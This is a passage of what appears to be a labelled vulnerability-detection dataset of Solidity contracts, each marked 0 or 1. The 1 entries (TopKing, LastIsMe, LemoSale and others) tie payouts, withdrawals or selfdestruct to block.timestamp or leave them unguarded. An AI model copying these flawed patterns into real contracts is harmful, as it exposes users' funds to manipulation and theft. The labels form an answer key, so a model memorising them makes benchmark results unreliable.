= get("pMinDeposit");        bytes32 propID = keccak256(_name, _value);        if (keccak256(_name) == keccak256("dispensationPct") ||            keccak256(_name) == keccak256("pDispensationPct")) {            require(_value <= 100);        }        require(!propExists(propID));          require(get(_name) != _value);                   proposals[propID] = ParamProposal({            appExpiry: now.add(get("pApplyStageLen")),            challengeID: 0,            deposit: deposit,            name: _name,            owner: msg.sender,            processBy: now.add(get("pApplyStageLen"))                .add(get("pCommitStageLen"))                .add(get("pRevealStageLen"))                .add(PROCESSBY),            value: _value        });        require(token.transferFrom(msg.sender, this, deposit));          emit _ReparameterizationProposal(_name, _value, propID, deposit, proposals[propID].appExpiry, msg.sender);        return propID;    }         function challengeReparameterization(bytes32 _propID) public returns (uint challengeID) {        ParamProposal memory prop = proposals[_propID];        uint deposit = prop.deposit;        require(propExists(_propID) && prop.challengeID == 0);                 uint pollID = voting.startPoll(            get("pVoteQuorum"),            get("pCommitStageLen"),            get("pRevealStageLen")        );        challenges[pollID] = Challenge({            challenger: msg.sender,            rewardPool: SafeMath.sub(100, get("pDispensationPct")).mul(deposit).div(100),            stake: deposit,            resolved: false,            winningTokens: 0        });        proposals[_propID].challengeID = pollID;                         require(token.transferFrom(msg.sender, this, deposit));        var (commitEndDate, revealEndDate,) = voting.pollMap(pollID);        emit _NewChallenge(_propID, pollID, commitEndDate, revealEndDate, msg.sender);        return pollID;    }         function processProposal(bytes32 _propID) public {        ParamProposal storage prop = proposals[_propID];        address propOwner = prop.owner;        uint propDeposit = prop.deposit;                                  if (canBeSet(_propID)) {                                      set(prop.name, prop.value);            emit _ProposalAccepted(_propID, prop.name, prop.value);            delete proposals[_propID];            require(token.transfer(propOwner, propDeposit));        } else if (challengeCanBeResolved(_propID)) {                         resolveChallenge(_propID);        } else if (now > prop.processBy) {                         emit _ProposalExpired(_propID);            delete proposals[_propID];            require(token.transfer(propOwner, propDeposit));        } else {                                      revert();        }        assert(get("dispensationPct") <= 100);        assert(get("pDispensationPct") <= 100);                 now.add(get("pApplyStageLen"))            .add(get("pCommitStageLen"))            .add(get("pRevealStageLen"))            .add(PROCESSBY);        delete proposals[_propID];    }         function claimReward(uint _challengeID, uint _salt) public {                 require(challenges[_challengeID].tokenClaims[msg.sender] == false);        require(challenges[_challengeID].resolved == true);        uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);        uint reward = voterReward(msg.sender, _challengeID, _salt);                          challenges[_challengeID].winningTokens -= voterTokens;        challenges[_challengeID].rewardPool -= reward;                 challenges[_challengeID].tokenClaims[msg.sender] = true;        emit _RewardClaimed(_challengeID, reward, msg.sender);        require(token.transfer(msg.sender, reward));    }         function claimRewards(uint[] _challengeIDs, uint[] _salts) public {                 require(_challengeIDs.length == _salts.length);                 for (uint i = 0; i < _challengeIDs.length; i++) {            claimReward(_challengeIDs[i], _salts[i]);        }    }                        function voterReward(address _voter, uint _challengeID, uint _salt)    public view returns (uint) {        uint winningTokens = challenges[_challengeID].winningTokens;        uint rewardPool = challenges[_challengeID].rewardPool;        uint voterTokens = voting.getNumPassingTokens(_voter, _challengeID, _salt);        return (voterTokens * rewardPool) / winningTokens;    }         function canBeSet(bytes32 _propID) view public returns (bool) {        ParamProposal memory prop = proposals[_propID];        return (now > prop.appExpiry && now < prop.processBy && prop.challengeID == 0);    }         function propExists(bytes32 _propID) view public returns (bool) {        return proposals[_propID].processBy > 0;    }         function challengeCanBeResolved(bytes32 _propID) view public returns (bool) {        ParamProposal memory prop = proposals[_propID];        Challenge memory challenge = challenges[prop.challengeID];        return (prop.challengeID > 0 && challenge.resolved == false && voting.pollEnded(prop.challengeID));    }         function challengeWinnerReward(uint _challengeID) public view returns (uint) {        if(voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {                         return 2 * challenges[_challengeID].stake;        }        return (2 * challenges[_challengeID].stake) - challenges[_challengeID].rewardPool;    }         function get(string _name) public view returns (uint value) {        return params[keccak256(_name)];    }         function tokenClaims(uint _challengeID, address _voter) public view returns (bool) {        return challenges[_challengeID].tokenClaims[_voter];    }                        function resolveChallenge(bytes32 _propID) private {        ParamProposal memory prop = proposals[_propID];        Challenge storage challenge = challenges[prop.challengeID];                 uint reward = challengeWinnerReward(prop.challengeID);        challenge.winningTokens = voting.getTotalNumberOfTokensForWinningOption(prop.challengeID);        challenge.resolved = true;        if (voting.isPassed(prop.challengeID)) {              if(prop.processBy > now) {                set(prop.name, prop.value);            }            emit _ChallengeFailed(_propID, prop.challengeID, challenge.rewardPool, challenge.winningTokens);            require(token.transfer(prop.owner, reward));        }        else {              emit _ChallengeSucceeded(_propID, prop.challengeID, challenge.rewardPool, challenge.winningTokens);            require(token.transfer(challenges[prop.challengeID].challenger, reward));        }    }         function set(string _name, uint _value) private {        params[keccak256(_name)] = _value;    }}  pragma solidity ^0.4.19; 
0<CODESPLIT>contract ProxyFactory {    event ProxyDeployed(address proxyAddress, address targetAddress);    event ProxiesDeployed(address[] proxyAddresses, address targetAddress);    function createManyProxies(uint256 _count, address _target, bytes _data)        public    {        address[] memory proxyAddresses = new address[](_count);        for (uint256 i = 0; i < _count; ++i) {            proxyAddresses[i] = createProxyImpl(_target, _data);        }        ProxiesDeployed(proxyAddresses, _target);    }    function createProxy(address _target, bytes _data)        public        returns (address proxyContract)    {        proxyContract = createProxyImpl(_target, _data);        ProxyDeployed(proxyContract, _target);    }        function createProxyImpl(address _target, bytes _data)        internal        returns (address proxyContract)    {        assembly {            let contractCode := mload(0x40)                         mstore(add(contractCode, 0x0b), _target)              mstore(sub(contractCode, 0x09), 0x000000000000000000603160008181600b9039f3600080808080368092803773)              mstore(add(contractCode, 0x2b), 0x5af43d828181803e808314602f57f35bfd000000000000000000000000000000)              proxyContract := create(0, contractCode, 60)              if iszero(extcodesize(proxyContract)) {                revert(0, 0)            }                                    let dataLength := mload(_data)             if iszero(iszero(dataLength)) {                if iszero(call(gas, proxyContract, 0, add(_data, 0x20), dataLength, 0, 0)) {                    revert(0, 0)                }            }        }    }}  pragma solidity ^0.4.8;
0<CODESPLIT>contract EIP20 is EIP20Interface {    uint256 constant MAX_UINT256 = 2**256 - 1;         string public name;                        uint8 public decimals;                     string public symbol;                       function EIP20(        uint256 _initialAmount,        string _tokenName,        uint8 _decimalUnits,        string _tokenSymbol        ) public {        balances[msg.sender] = _initialAmount;                        totalSupply = _initialAmount;                                 name = _tokenName;                                            decimals = _decimalUnits;                                     symbol = _tokenSymbol;                                    }    function transfer(address _to, uint256 _value) public returns (bool success) {                                            require(balances[msg.sender] >= _value);        balances[msg.sender] -= _value;        balances[_to] += _value;        Transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {                          uint256 allowance = allowed[_from][msg.sender];        require(balances[_from] >= _value && allowance >= _value);        balances[_to] += _value;        balances[_from] -= _value;        if (allowance < MAX_UINT256) {            allowed[_from][msg.sender] -= _value;        }        Transfer(_from, _to, _value);        return true;    }    function balanceOf(address _owner) view public returns (uint256 balance) {        return balances[_owner];    }    function approve(address _spender, uint256 _value) public returns (bool success) {        allowed[msg.sender][_spender] = _value;        Approval(msg.sender, _spender, _value);        return true;    }    function allowance(address _owner, address _spender)    view public returns (uint256 remaining) {      return allowed[_owner][_spender];    }    mapping (address => uint256) balances;    mapping (address => mapping (address => uint256)) allowed;} 
0<CODESPLIT>contract PLCRFactory {  event newPLCR(address creator, EIP20 token, PLCRVoting plcr);  ProxyFactory public proxyFactory;  PLCRVoting public canonizedPLCR;     constructor() {    canonizedPLCR = new PLCRVoting();    proxyFactory = new ProxyFactory();  }     function newPLCRBYOToken(EIP20 _token) public returns (PLCRVoting) {    PLCRVoting plcr = PLCRVoting(proxyFactory.createProxy(canonizedPLCR, ""));    plcr.init(_token);    emit newPLCR(msg.sender, _token, plcr);    return plcr;  }       function newPLCRWithToken(    uint _supply,    string _name,    uint8 _decimals,    string _symbol  ) public returns (PLCRVoting) {         EIP20 token = new EIP20(_supply, _name, _decimals, _symbol);    token.transfer(msg.sender, _supply);         PLCRVoting plcr = PLCRVoting(proxyFactory.createProxy(canonizedPLCR, ""));    plcr.init(token);    emit newPLCR(msg.sender, token, plcr);    return plcr;  }} 
0<CODESPLIT>contract ParameterizerFactory {    event NewParameterizer(address creator, address token, address plcr, Parameterizer parameterizer);    PLCRFactory public plcrFactory;    ProxyFactory public proxyFactory;    Parameterizer public canonizedParameterizer;         constructor(PLCRFactory _plcrFactory) public {        plcrFactory = _plcrFactory;        proxyFactory = plcrFactory.proxyFactory();        canonizedParameterizer = new Parameterizer();    }         function newParameterizerBYOToken(        EIP20 _token,        uint[] _parameters    ) public returns (Parameterizer) {        PLCRVoting plcr = plcrFactory.newPLCRBYOToken(_token);        Parameterizer parameterizer = Parameterizer(proxyFactory.createProxy(canonizedParameterizer, ""));        parameterizer.init(            _token,            plcr,            _parameters        );        emit NewParameterizer(msg.sender, _token, plcr, parameterizer);        return parameterizer;    }         function newParameterizerWithToken(        uint _supply,        string _name,        uint8 _decimals,        string _symbol,        uint[] _parameters    ) public returns (Parameterizer) {                          PLCRVoting plcr = plcrFactory.newPLCRWithToken(_supply, _name, _decimals, _symbol);        EIP20 token = EIP20(plcr.token());        token.transfer(msg.sender, _supply);                 Parameterizer parameterizer = Parameterizer(proxyFactory.createProxy(canonizedParameterizer, ""));        parameterizer.init(            token,            plcr,            _parameters        );        emit NewParameterizer(msg.sender, token, plcr, parameterizer);        return parameterizer;    }} 
0<CODESPLIT>contract RegistryFactory {    event NewRegistry(address creator, EIP20 token, PLCRVoting plcr, Parameterizer parameterizer, Registry registry);    ParameterizerFactory public parameterizerFactory;    ProxyFactory public proxyFactory;    Registry public canonizedRegistry;         constructor(ParameterizerFactory _parameterizerFactory) public {        parameterizerFactory = _parameterizerFactory;        proxyFactory = parameterizerFactory.proxyFactory();        canonizedRegistry = new Registry();    }         function newRegistryBYOToken(        EIP20 _token,        uint[] _parameters,        string _name    ) public returns (Registry) {        Parameterizer parameterizer = parameterizerFactory.newParameterizerBYOToken(_token, _parameters);        PLCRVoting plcr = parameterizer.voting();        Registry registry = Registry(proxyFactory.createProxy(canonizedRegistry, ""));        registry.init(_token, plcr, parameterizer, _name);        emit NewRegistry(msg.sender, _token, plcr, parameterizer, registry);        return registry;    }         function newRegistryWithToken(        uint _supply,        string _tokenName,        uint8 _decimals,        string _symbol,        uint[] _parameters,        string _registryName    ) public returns (Registry) {                          Parameterizer parameterizer = parameterizerFactory.newParameterizerWithToken(_supply, _tokenName, _decimals, _symbol, _parameters);        EIP20 token = EIP20(parameterizer.token());        token.transfer(msg.sender, _supply);        PLCRVoting plcr = parameterizer.voting();                 Registry registry = Registry(proxyFactory.createProxy(canonizedRegistry, ""));        registry.init(token, plcr, parameterizer, _registryName);        emit NewRegistry(msg.sender, token, plcr, parameterizer, registry);        return registry;    }}
0<CODESPLIT>contract CareerChainToken is CappedToken(145249999000000000000000000), BurnableToken  {    string public name = "CareerChain Token";    string public symbol = "CCH";    uint8 public decimals = 18;         function burn(uint256 _value) public onlyOwner {      _burn(msg.sender, _value);    }} library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {    if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {                   return a / b;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }} 
1<CODESPLIT>contract CareerChainPrivateSale is TimedCrowdsale, WhitelistedCrowdsale  {    using SafeMath for uint256;         uint256 public tokensStillInLockup;         uint256[6] public lockupEndTime;         mapping(address => uint256) public balances;         mapping(address => uint256) public released;         uint256 public firstVestedLockUpAmount;    uint256 public stagedVestedLockUpAmounts;              function CareerChainPrivateSale        (            uint256 _openingTime,            uint256 _closingTime,            uint256 _rate,            address _wallet,            uint256[6] _lockupEndTime,            uint256 _firstVestedLockUpAmount,            uint256 _stagedVestedLockUpAmounts,            CareerChainToken _token        )        public        Crowdsale(_rate, _wallet, _token)        TimedCrowdsale(_openingTime, _closingTime)        {                         require(_lockupEndTime[0] >= block.timestamp);            require(_lockupEndTime[1] >= _lockupEndTime[0]);            require(_lockupEndTime[2] >= _lockupEndTime[1]);            require(_lockupEndTime[3] >= _lockupEndTime[2]);            require(_lockupEndTime[4] >= _lockupEndTime[3]);            require(_lockupEndTime[5] >= _lockupEndTime[4]);            lockupEndTime = _lockupEndTime;            firstVestedLockUpAmount = _firstVestedLockUpAmount;            stagedVestedLockUpAmounts = _stagedVestedLockUpAmounts;        }                   function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {        uint256 newTokensSold = tokensStillInLockup.add(_tokenAmount);        require(newTokensSold <= token.balanceOf(address(this)));        tokensStillInLockup = newTokensSold;                 balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);    }              function TransferUnsoldTokensBackToTokenContract(address _beneficiary) public onlyOwner {        require(hasClosed());        uint256 unSoldTokens = token.balanceOf(address(this)).sub(tokensStillInLockup);        token.transfer(_beneficiary, unSoldTokens);    }                   function IssueTokensToInvestors(address _beneficiary, uint256 _amount) public onlyOwner onlyWhileOpen{        require(_beneficiary != address(0));        _processPurchase(_beneficiary, _amount);    }         function _changeRate(uint256 _rate) public onlyOwner {        require(_rate > 0);        rate = _rate;    }         function releasableAmount() private view returns (uint256) {      return vestedAmount().sub(released[msg.sender]);    }         function vestedAmount() private view returns (uint256) {      uint256 lockupStage = 0;      uint256 releasable = 0;             uint256 i=0;      while (i < lockupEndTime.length && lockupEndTime[i]<=now)      {        lockupStage = lockupStage.add(1);        i = i.add(1);      }             if(lockupStage>0)      {                 releasable = (lockupStage.sub(1).mul(stagedVestedLockUpAmounts)).add(firstVestedLockUpAmount);      }      return releasable;    }         function withdrawTokens() public {      uint256 tobeReleased = 0;      uint256 unreleased = releasableAmount();             if(balances[msg.sender] >= unreleased && lockupEndTime[lockupEndTime.length-1] > now)      {        tobeReleased = unreleased;      }      else      {        tobeReleased = balances[msg.sender];      }             require(tobeReleased > 0);      balances[msg.sender] = balances[msg.sender].sub(tobeReleased);      tokensStillInLockup = tokensStillInLockup.sub(tobeReleased);      released[msg.sender] = released[msg.sender].add(tobeReleased);      _deliverTokens(msg.sender, tobeReleased);    }}
1<CODESPLIT>contract JobsBounty is Ownable, ReentrancyGuard {    using SafeMath for uint256;    string public companyName;      string public jobPost;      uint public endDate;                                  address public INDToken;        constructor(string _companyName,                string _jobPost,                uint _endDate,                address _INDToken                ) public{        companyName = _companyName;        jobPost = _jobPost ;        endDate = _endDate;        INDToken = _INDToken;    }             function ownBalance() public view returns(uint256) {        return SafeMath.div(ERC20(INDToken).balanceOf(this),1 ether);    }        function payOutBounty(address _referrerAddress, address _candidateAddress) external onlyOwner nonReentrant returns(bool){        assert(block.timestamp >= endDate);        assert(_referrerAddress != address(0x0));        assert(_candidateAddress != address(0x0));                uint256 individualAmounts = SafeMath.mul(SafeMath.div((ERC20(INDToken).balanceOf(this)),100),50);                         assert(ERC20(INDToken).transfer(_candidateAddress, individualAmounts));        assert(ERC20(INDToken).transfer(_referrerAddress, individualAmounts));        return true;        }                       function withdrawERC20Token(address anyToken) external onlyOwner nonReentrant returns(bool){        assert(block.timestamp >= endDate);        assert(ERC20(anyToken).transfer(owner, ERC20(anyToken).balanceOf(this)));                return true;    }                  function withdrawEther() external onlyOwner nonReentrant returns(bool){        if(address(this).balance > 0){            owner.transfer(address(this).balance);        }                return true;    }}
1<CODESPLIT>contract TopKing{    uint public jackpot;    uint public withdrawDelay;    function takeAll() public{        require(block.timestamp >= withdrawDelay);        msg.sender.transfer(this.balance);        jackpot = 0;        return;    }}
1<CODESPLIT>contract InsightsNetwork1 {  mapping (address => uint) public unlockTimes;  function register(address newTokenHolder, uint issueAmount) {    uint currentTime = block.timestamp;    uint unlockTime = currentTime + 365*24*60*60;    assert(unlockTime > currentTime);    unlockTimes[newTokenHolder] = unlockTime;    return;  }}
1<CODESPLIT>contract LastIsMe {  address public lastPlayer;  uint    public jackpot;  uint    public startedAt;  function buyTicket(address _ref) {      if(lastPlayer != 0x0 ) {        lastPlayer.send(jackpot);        startedAt  = block.timestamp;        return;      }      return;  }}
1<CODESPLIT>contract LemoSale {    uint256 public endTime = 0;    address public owner;    function destroy() public  {        require(block.timestamp >= endTime + 3600 * 24 * 30 * 3);        selfdestruct(owner);        return;    }}
1<CODESPLIT>contract Basic {    uint256 public openingTime;    function getLimitPeriod() external view returns (uint256) {        uint256 presentTime = block.timestamp;        uint256 timeValue = presentTime - (openingTime);        uint256 result = timeValue / (31 days);        return result;    }}
0<CODESPLIT>contract CALLGToken is MintableToken {	string public name = "CAPITAL GAS";	string public symbol = "CALLG";	uint8 public decimals = 18;} 
0<CODESPLIT>contract CALLToken is MintableToken {	string public name = "CAPITAL";	string public symbol = "CALL";	uint8 public decimals = 18;}
0<CODESPLIT>contract TeamVault is Ownable {    using SafeMath for uint256;    ERC20 public token_call;    ERC20 public token_callg;    event TeamWithdrawn(address indexed teamWallet, uint256 token_call, uint256 token_callg);    constructor (ERC20 _token_call, ERC20 _token_callg) public {        require(_token_call != address(0));        require(_token_callg != address(0));        token_call = _token_call;        token_callg = _token_callg;    }    function () public payable {    }    function withdrawTeam(address teamWallet) public onlyOwner {        require(teamWallet != address(0));        uint call_balance = token_call.balanceOf(this);        uint callg_balance = token_callg.balanceOf(this);        token_call.transfer(teamWallet, call_balance);        token_callg.transfer(teamWallet, callg_balance);        emit TeamWithdrawn(teamWallet, call_balance, callg_balance);    }}
0<CODESPLIT>contract BountyVault is Ownable {    using SafeMath for uint256;    ERC20 public token_call;    ERC20 public token_callg;    event BountyWithdrawn(address indexed bountyWallet, uint256 token_call, uint256 token_callg);    constructor (ERC20 _token_call, ERC20 _token_callg) public {        require(_token_call != address(0));        require(_token_callg != address(0));        token_call = _token_call;        token_callg = _token_callg;    }    function () public payable {    }    function withdrawBounty(address bountyWallet) public onlyOwner {        require(bountyWallet != address(0));        uint call_balance = token_call.balanceOf(this);        uint callg_balance = token_callg.balanceOf(this);        token_call.transfer(bountyWallet, call_balance);        token_callg.transfer(bountyWallet, callg_balance);        emit BountyWithdrawn(bountyWallet, call_balance, callg_balance);    }} 
0<CODESPLIT>contract FiatContract {  function USD(uint _id) constant returns (uint256);}
0<CODESPLIT>contract CapitalTechCrowdsale is Ownable {  using SafeMath for uint256;  ERC20 public token_call;  ERC20 public token_callg;  FiatContract public fiat_contract;  RefundVault public vault;  TeamVault public teamVault;  BountyVault public bountyVault;  enum stages { PRIVATE_SALE, PRE_SALE, MAIN_SALE_1, MAIN_SALE_2, MAIN_SALE_3, MAIN_SALE_4, FINALIZED }  address public wallet;  uint256 public maxContributionPerAddress;  uint256 public stageStartTime;  uint256 public weiRaised;  uint256 public minInvestment;  stages public stage;  bool public is_finalized;  bool public powered_up;  bool public distributed_team;  bool public distributed_bounty;  mapping(address => uint256) public contributions;  mapping(address => uint256) public userHistory;  mapping(uint256 => uint256) public stages_duration;  uint256 public callSoftCap;  uint256 public callgSoftCap;  uint256 public callDistributed;  uint256 public callgDistributed;  uint256 public constant decimals = 18;  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount_call, uint256 amount_callg);  event TokenTransfer(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount_call, uint256 amount_callg);  event StageChanged(stages stage, stages next_stage, uint256 stageStartTime);  event GoalReached(uint256 callSoftCap, uint256 callgSoftCap);  event Finalized(uint256 callDistributed, uint256 callgDistributed);  function () external payable {    buyTokens(msg.sender);  }  constructor(address _wallet, address _fiatcontract, ERC20 _token_call, ERC20 _token_callg) public {    require(_token_call != address(0));    require(_token_callg != address(0));    require(_wallet != address(0));    require(_fiatcontract != address(0));    token_call = _token_call;    token_callg = _token_callg;    wallet = _wallet;    fiat_contract = FiatContract(_fiatcontract);    vault = new RefundVault(_wallet);    bountyVault = new BountyVault(_token_call, _token_callg);    teamVault = new TeamVault(_token_call, _token_callg);  }  function powerUpContract() public onlyOwner {    require(!powered_up);    require(!is_finalized);    stageStartTime = block.timestamp;    stage = stages.PRIVATE_SALE;    weiRaised = 0;  	distributeTeam();  	distributeBounty();	  callDistributed = 7875000 * 10 ** decimals;    callgDistributed = 1575000000 * 10 ** decimals;    callSoftCap = 18049500 * 10 ** decimals;    callgSoftCap = 3609900000 * 10 ** decimals;    maxContributionPerAddress = 1500 ether;    minInvestment = 0.01 ether;    is_finalized = false;    powered_up = true;    stages_duration[uint256(stages.PRIVATE_SALE)] = 30 days;    stages_duration[uint256(stages.PRE_SALE)] = 30 days;    stages_duration[uint256(stages.MAIN_SALE_1)] = 7 days;    stages_duration[uint256(stages.MAIN_SALE_2)] = 7 days;    stages_duration[uint256(stages.MAIN_SALE_3)] = 7 days;    stages_duration[uint256(stages.MAIN_SALE_4)] = 7 days;  }  function distributeTeam() public onlyOwner {    require(!distributed_team);    uint256 _amount = 5250000 * 10 ** decimals;    distributed_team = true;    MintableToken(token_call).mint(teamVault, _amount);    MintableToken(token_callg).mint(teamVault, _amount.mul(200));    emit TokenTransfer(msg.sender, teamVault, _amount, _amount, _amount.mul(200));  }  function distributeBounty() public onlyOwner {    require(!distributed_bounty);    uint256 _amount = 2625000 * 10 ** decimals;    distributed_bounty = true;    MintableToken(token_call).mint(bountyVault, _amount);    MintableToken(token_callg).mint(bountyVault, _amount.mul(200));    emit TokenTransfer(msg.sender, bountyVault, _amount, _amount, _amount.mul(200));  }  function withdrawBounty(address _beneficiary) public onlyOwner {    require(distributed_bounty);    bountyVault.withdrawBounty(_beneficiary);  }  function withdrawTeam(address _beneficiary) public onlyOwner {    require(distributed_team);    teamVault.withdrawTeam(_beneficiary);  }  function getUserContribution(address _beneficiary) public view returns (uint256) {    return contributions[_beneficiary];  }  function getUserHistory(address _beneficiary) public view returns (uint256) {    return userHistory[_beneficiary];  }  function getReferrals(address[] _beneficiaries) public view returns (address[], uint256[]) {  	address[] memory addrs = new address[](_beneficiaries.length);  	uint256[] memory funds = new uint256[](_beneficiaries.length);  	for (uint256 i = 0; i < _beneficiaries.length; i++) {  		addrs[i] = _beneficiaries[i];  		funds[i] = getUserHistory(_beneficiaries[i]);  	}    return (addrs, funds);  }  function getAmountForCurrentStage(uint256 _amount) public view returns(uint256) {    uint256 tokenPrice = fiat_contract.USD(0);    if(stage == stages.PRIVATE_SALE) {      tokenPrice = tokenPrice.mul(35).div(10 ** 8);    } else if(stage == stages.PRE_SALE) {      tokenPrice = tokenPrice.mul(50).div(10 ** 8);    } else if(stage == stages.MAIN_SALE_1) {      tokenPrice = tokenPrice.mul(70).div(10 ** 8);    } else if(stage == stages.MAIN_SALE_2) {      tokenPrice = tokenPrice.mul(80).div(10 ** 8);    } else if(stage == stages.MAIN_SALE_3) {      tokenPrice = tokenPrice.mul(90).div(10 ** 8);    } else if(stage == stages.MAIN_SALE_4) {      tokenPrice = tokenPrice.mul(100).div(10 ** 8);    }    return _amount.div(tokenPrice).mul(10 ** 10);  }  function _getNextStage() internal view returns (stages) {    stages next_stage;    if (stage == stages.PRIVATE_SALE) {      next_stage = stages.PRE_SALE;    } else if (stage == stages.PRE_SALE) {      next_stage = stages.MAIN_SALE_1;    } else if (stage == stages.MAIN_SALE_1) {      next_stage = stages.MAIN_SALE_2;    } else if (stage == stages.MAIN_SALE_2) {      next_stage = stages.MAIN_SALE_3;    } else if (stage == stages.MAIN_SALE_3) {      next_stage = stages.MAIN_SALE_4;    } else {      next_stage = stages.FINALIZED;    }    return next_stage;  }  function getHardCap() public view returns (uint256, uint256) {    uint256 hardcap_call;    uint256 hardcap_callg;    if (stage == stages.PRIVATE_SALE) {      hardcap_call = 10842563;      hardcap_callg = 2168512500;    } else if (stage == stages.PRE_SALE) {      hardcap_call = 18049500;      hardcap_callg = 3609900000;    } else if (stage == stages.MAIN_SALE_1) {      hardcap_call = 30937200;      hardcap_callg = 6187440000;    } else if (stage == stages.MAIN_SALE_2) {      hardcap_call = 40602975;      hardcap_callg = 8120595000;    } else if (stage == stages.MAIN_SALE_3) {      hardcap_call = 47046825;      hardcap_callg = 9409365000;    } else {      hardcap_call = 52500000;      hardcap_callg = 10500000000;    }    return (hardcap_call.mul(10 ** decimals), hardcap_callg.mul(10 ** decimals));  }  function updateStage() public {    _updateStage(0, 0);  }  function _updateStage(uint256 weiAmount, uint256 callAmount) internal {    uint256 _duration = stages_duration[uint256(stage)];    uint256 call_tokens = 0;    if (weiAmount != 0) {      call_tokens = getAmountForCurrentStage(weiAmount);    } else {      call_tokens = callAmount;    }    uint256 callg_tokens = call_tokens.mul(200);    (uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();    if(stageStartTime.add(_duration) <= block.timestamp || callDistributed.add(call_tokens) >= _hardcapCall || callgDistributed.add(callg_tokens) >= _hardcapCallg) {      stages next_stage = _getNextStage();      emit StageChanged(stage, next_stage, stageStartTime);      stage = next_stage;      if (next_stage != stages.FINALIZED) {        stageStartTime = block.timestamp;      } else {        finalization();      }    }  }  function buyTokens(address _beneficiary) public payable {    require(!is_finalized);    if (_beneficiary == address(0)) {      _beneficiary = msg.sender;    }    (uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();    uint256 weiAmount = msg.value;    require(weiAmount > 0);    require(_beneficiary != address(0));    require(weiAmount >= minInvestment);    require(contributions[_beneficiary].add(weiAmount) <= maxContributionPerAddress);    _updateStage(weiAmount, 0);    uint256 call_tokens = getAmountForCurrentStage(weiAmount);    uint256 callg_tokens = call_tokens.mul(200);    weiRaised = weiRaised.add(weiAmount);    callDistributed = callDistributed.add(call_tokens);    callgDistributed = callgDistributed.add(callg_tokens);    MintableToken(token_call).mint(_beneficiary, call_tokens);    MintableToken(token_callg).mint(_beneficiary, callg_tokens);    emit TokenPurchase(msg.sender, _beneficiary, weiAmount, call_tokens, callg_tokens);    contributions[_beneficiary] = contributions[_beneficiary].add(weiAmount);    userHistory[_beneficiary] = userHistory[_beneficiary].add(call_tokens);    vault.deposit.value(msg.value)(msg.sender);  }  function finalize() onlyOwner public {    stage = stages.FINALIZED;    finalization();  }  function extendPeriod(uint256 date) public onlyOwner {    stages_duration[uint256(stage)] = stages_duration[uint256(stage)].add(date);  }  function transferTokens(address _to, uint256 _amount) public onlyOwner {    require(!is_finalized);    require(_to != address(0));    require(_amount > 0);    _updateStage(0, _amount);    callDistributed = callDistributed.add(_amount);    callgDistributed = callgDistributed.add(_amount.mul(200));    if (stage == stages.FINALIZED) {      (uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();      require(callDistributed.add(callDistributed) <= _hardcapCall);      require(callgDistributed.add(callgDistributed) <= _hardcapCallg);    }    MintableToken(token_call).mint(_to, _amount);    MintableToken(token_callg).mint(_to, _amount.mul(200));    userHistory[_to] = userHistory[_to].add(_amount);    emit TokenTransfer(msg.sender, _to, _amount, _amount, _amount.mul(200));  }  function claimRefund() public {	  address _beneficiary = msg.sender;    require(is_finalized);    require(!goalReached());    userHistory[_beneficiary] = 0;    vault.refund(_beneficiary);  }  function goalReached() public view returns (bool) {    if (callDistributed >= callSoftCap && callgDistributed >= callgSoftCap) {      return true;    } else {      return false;    }  }  function finishMinting() public onlyOwner {    MintableToken(token_call).finishMinting();    MintableToken(token_callg).finishMinting();  }  function finalization() internal {    require(!is_finalized);    is_finalized = true;    finishMinting();    emit Finalized(callDistributed, callgDistributed);    if (goalReached()) {      emit GoalReached(callSoftCap, callgSoftCap);      vault.close();    } else {      vault.enableRefunds();    }  }}
1<CODESPLIT>contract TeamToken  {    uint64 public gameTime;    function() payable public {        if (gameTime > 1514764800) {            require(gameTime - 300 > block.timestamp);        }        return;    }}
0<CODESPLIT>contract TokenlessCrowdsale {  using SafeMath for uint256;     address public wallet;     uint256 public weiRaised;     event SaleContribution(address indexed purchaser, address indexed beneficiary, uint256 value);     constructor (address _wallet) public {    require(_wallet != address(0));    wallet = _wallet;  }              function () external payable {    buyTokens(msg.sender);  }     function buyTokens(address _beneficiary) public payable {    uint256 weiAmount = msg.value;    _preValidatePurchase(_beneficiary, weiAmount);         weiRaised = weiRaised.add(weiAmount);    _processPurchaseInWei(_beneficiary, weiAmount);    emit SaleContribution(      msg.sender,      _beneficiary,      weiAmount    );    _updatePurchasingState(_beneficiary, weiAmount);    _forwardFunds();    _postValidatePurchase(_beneficiary, weiAmount);  }              function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {    require(_beneficiary != address(0));    require(_weiAmount != 0);  }     function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {       }     function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {       }     function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {       }     function _forwardFunds() internal {    wallet.transfer(msg.value);  }} 
